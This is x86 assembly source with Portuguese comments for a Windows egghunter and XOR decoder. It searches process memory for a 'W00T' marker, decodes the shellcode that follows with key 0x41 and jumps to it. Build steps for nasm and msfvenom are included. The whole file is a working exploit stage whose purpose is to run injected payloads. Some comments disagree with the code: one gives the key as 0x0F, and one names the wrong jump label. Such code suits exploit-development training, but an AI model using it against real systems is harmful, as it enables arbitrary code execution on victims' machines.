[BITS 32]

; Encoder/decoder
; Autor: Helvio Junior (M4v3r1cK)
;
; Procedimento de compilação do EggHunter
; nasm decoder.asm -o decoder -l decoder.lst
; cat decoder | msfvenom -p - -a x86 --platform win -e generic/none -f hex
;
; 47 bytes encoder/decoder
;
;Find, decode and execute

_start:
    call get_eip            ; Faz um call para a função (colocando o EIP atual em EAX)
                            ; isso faz que o aplicativo monte a pilha para a função, fazendo com que o 
                            ; endereço do ESP (na pilha do get_eip) seja o endereço de retorno, ou seja,
                            ; o endereço do EIP do fluxo normal de execução

    JMP is_the_egg

loop_inc_egg:
    inc EDX                 ; atua como um contador
                            ; incrementa 1 ao valor de EAX
is_the_egg:
    mov eax,0x57303054      ; este é o EGG, ou seja o texto que estamos procurando (W00T)
    mov edi,edx             ; define EDI para nosso endereço de memória
    scasd                   ; compara EAX com o conteúdo de EDI (que é o conteúdo do EDX)
    jnz loop_inc_egg        ; checa se são iguais, caso não, salta para loop_inc_one
                            ; caso sejam simplesmente continua a execução indo para o próximo passo
    scasd                   ; realiza a checagem do proximo endereçamento de memória EDX + 4, para checar o segundo EGG
    jnz loop_inc_egg        ; checa se são iguais, caso não, salta para loop_inc_one
                            ; caso sejam simplesmente continua a execução indo para o próximo passo

matched:
    MOV EAX, EDI            ; EDI aponta para o início do shellcode
                            ; Copia o valor para EAX que iniciara o decode
    MOV EBX, EDI            ; Copia o valor de EDI em EBX
    MOV ECX, EDI            ; Copia o valor de EDI em ECX
    ADD ECX, 400            ; Adiciona em ECX 400 bytes como indicador de final do shellcode
    
decode:
    XOR BYTE [EAX],0x41     ; XOR o conteúdo de EAX com a chave 0x0F

loop_inc_one:
    INC EAX                 ; atua como um contador
                            ; incrementa 1 ao valor de EAX

loop_check:                 ; checa o endereço atual
    CMP    EAX,ECX          ; Chegamos no endereço final da codificação?    
    JLE    decode           ; Se não, pulamos de volta para o XOR    

end:                        
    JMP EBX                 ; Salta para o shellcode

get_eip: 
    mov EDX, [ESP]          ; Quando dentro da função o valor de ESP é a mesma coisa que o EIP fora da call
    ret                     ; Retorna para o fluxo normal de execução (sai da função)
    
    
